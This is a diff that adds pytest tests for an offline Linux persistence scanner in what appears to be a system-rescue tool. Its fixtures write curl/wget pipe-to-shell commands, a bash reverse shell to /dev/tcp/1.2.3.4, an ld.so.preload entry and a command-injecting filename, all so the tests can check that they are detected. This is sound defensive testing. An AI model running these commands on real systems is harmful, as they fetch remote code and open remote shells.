@@ -190,3 +190,179 @@ def test_fix_never_deletes_and_prefers_disabling(tmp_path):
     text = " ".join(a.description for a in fix.actions)
     assert "disable" in text
     assert "cannot be examined" in text
+
+
+# ---------------- offline: a Linux disk mounted elsewhere ----------------
+
+from rescue.profiler.base import gather_target_profile  # noqa: E402
+
+_SUSP = "security.linux_persistence_audit.suspicious_content"
+
+
+def _offline(linux_disk):
+    return gather_target_profile(linux_disk, Platform.LINUX)
+
+
+def test_offline_finds_curl_pipe_sh_unit_on_target(linux_disk):
+    (linux_disk / "etc/systemd/system/updater.service").write_text(
+        "[Service]\nExecStart=/bin/sh -c 'curl http://x | sh'\n"
+    )
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/etc/systemd/system/updater.service"
+    assert r.not_checked == []
+
+
+def test_offline_reads_unit_symlink_from_target_not_host(linux_disk):
+    (linux_disk / "lib/systemd/system/evil.service").write_text(
+        "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'\n"
+    )
+    wants = linux_disk / "etc/systemd/system/multi-user.target.wants"
+    (wants / "evil.service").symlink_to("/lib/systemd/system/evil.service")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"].endswith("evil.service")
+    assert "/dev/tcp" in hit[0].data["excerpt"]
+
+
+def test_offline_does_not_follow_directory_symlink_to_host(linux_disk, tmp_path):
+    host = tmp_path / "hostdir"
+    host.mkdir()
+    (host / "x.service").write_text("ExecStart=curl http://x | sh\n")
+    (linux_disk / "etc/systemd/system/escape").symlink_to(host)
+    r = _get_module().check(_offline(linux_disk))
+    assert not [f for f in r.findings if f.code == _SUSP]
+
+
+def test_offline_expands_tilde_for_every_target_user(linux_disk):
+    d = linux_disk / "home/sam/.config/autostart"
+    d.mkdir(parents=True)
+    (d / "x.desktop").write_text("[Desktop Entry]\nExec=/tmp/.x\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings
+           if f.code == "security.linux_persistence_audit.volatile_path_execution"]
+    assert hit and hit[0].data["path"] == "/home/sam/.config/autostart/x.desktop"
+
+
+def test_offline_reads_spool_crontabs_and_never_runs_crontab(linux_disk):
+    spool = linux_disk / "var/spool/cron/crontabs"
+    spool.mkdir(parents=True)
+    (spool / "sam").write_text("* * * * * wget -qO- http://x | bash\n")
+    mod = _get_module()
+    with patch.object(sys.modules[type(mod).__module__], "run",
+                      side_effect=AssertionError("no host commands offline")):
+        r = mod.check(_offline(linux_disk))
+    assert any(f.data.get("path") == "/var/spool/cron/crontabs/sam"
+               for f in r.findings if f.code == _SUSP)
+    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
+    assert {"path": "/var/spool/cron/crontabs/sam", "kind": "user crontab"} in inv.data["entries"]
+
+
+def test_offline_ld_preload_read_from_target(linux_disk):
+    (linux_disk / "etc/ld.so.preload").write_text("/usr/lib/libevil.so\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
+    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"
+
+
+def test_offline_world_writable_unit(linux_disk):
+    p = linux_disk / "etc/systemd/system/loose.service"
+    p.write_text("[Service]\n")
+    p.chmod(0o666)
+    r = _get_module().check(_offline(linux_disk))
+    assert any(f.code == "security.linux_persistence_audit.world_writable_unit"
+               and f.data["path"] == "/etc/systemd/system/loose.service" for f in r.findings)
+
+
+def test_offline_ordinary_disk_has_no_warnings(linux_disk):
+    r = _get_module().check(_offline(linux_disk))
+    assert [f for f in r.findings if f.severity is not Severity.INFO] == []
+
+
+def test_offline_capable_flag():
+    assert _get_module().offline_capable is True
+
+
+def test_offline_symlinked_ld_preload_is_reported_as_etc_ld_so_preload(linux_disk):
+    (linux_disk / "usr/lib").mkdir(parents=True)
+    (linux_disk / "usr/lib/pre").write_text("/usr/lib/libevil.so\n")
+    (linux_disk / "etc/ld.so.preload").symlink_to("/usr/lib/pre")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
+    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"
+    assert "/etc/ld.so.preload lists" in hit[0].description
+
+
+def test_offline_symlinked_bashrc_shown_at_its_own_path(linux_disk):
+    (linux_disk / "home/sam/dotfiles").mkdir()
+    (linux_disk / "home/sam/dotfiles/bashrc").write_text("curl http://x | sh\n")
+    (linux_disk / "home/sam/.bashrc").symlink_to("dotfiles/bashrc")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/home/sam/.bashrc"
+
+
+def test_offline_symlinked_walk_root_shown_at_its_own_path(linux_disk):
+    (linux_disk / "opt/units").mkdir(parents=True)
+    (linux_disk / "opt/units/u.service").write_text("ExecStart=curl http://x | sh\n")
+    (linux_disk / "usr/local/lib/systemd").mkdir(parents=True)
+    (linux_disk / "usr/local/lib/systemd/system").symlink_to("/opt/units")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/usr/local/lib/systemd/system/u.service"
+
+
+def test_offline_spool_scan_is_capped(linux_disk):
+    spool = linux_disk / "var/spool/cron/crontabs"
+    spool.mkdir(parents=True)
+    for i in range(10):
+        (spool / f"u{i}").write_text("* * * * * true\n")
+    mod = _get_module()
+    mod.max_files = 3
+    r = mod.check(_offline(linux_disk))
+    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
+    assert len([e for e in inv.data["entries"] if e["kind"] == "user crontab"]) <= 3
+
+
+def test_offline_hostile_filename_is_quoted_in_guidance(linux_disk):
+    name = "x'; touch pwned; '.service"
+    (linux_disk / "etc/systemd/system" / name).write_text("ExecStart=curl http://x | sh\n")
+    mod = _get_module()
+    r = mod.check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit
+    actions = mod.fix(r, Mode.GUIDED if hasattr(Mode, "GUIDED") else list(Mode)[0]).actions
+    from shlex import quote
+    path = hit[0].data["path"]
+    text = "\n".join(a.description for a in actions)
+    assert f"cat {quote(path)}" in text
+    assert f"cat '{path}'" not in text
+
+
+def test_offline_control_characters_in_path_are_replaced(linux_disk):
+    (linux_disk / "etc/systemd/system" / "a\nb.service").write_text("ExecStart=curl http://x | sh\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and "\n" not in hit[0].data["path"] and "a?b.service" in hit[0].data["path"]
+
+
+_ADMIN_ONLY = "some files only an administrator can read"
+
+
+@pytest.mark.skipif(getattr(os, "geteuid", lambda: 1)() == 0, reason="root can read mode-000 files")
+def test_offline_unreadable_spool_crontab_is_not_checked(linux_disk):
+    spool = linux_disk / "var/spool/cron/crontabs"
+    spool.mkdir(parents=True)
+    for name in ("sam", "root"):
+        (spool / name).write_text("* * * * * true\n")
+        (spool / name).chmod(0)
+    try:
+        r = _get_module().check(_offline(linux_disk))
+    finally:
+        for name in ("sam", "root"):
+            (spool / name).chmod(0o644)
+    assert r.not_checked.count(_ADMIN_ONLY) == 1
+
+
+def test_offline_readable_disk_has_no_admin_only_entry(linux_disk):
+    assert _ADMIN_ONLY not in _get_module().check(_offline(linux_disk)).not_checked
